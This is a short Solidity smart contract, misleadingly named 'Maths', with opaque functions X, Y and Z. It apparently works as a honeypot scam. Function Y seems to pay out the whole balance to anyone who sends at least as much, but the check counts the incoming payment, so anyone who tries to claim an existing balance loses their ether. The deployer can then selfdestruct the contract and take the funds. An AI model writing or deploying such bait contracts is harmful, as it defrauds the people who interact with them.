1 pragma solidity ^0.4.25;
2 
3 contract Maths
4 {
5     address Z = msg.sender;
6     function() public payable {}
7     function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }
8     function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }
9  }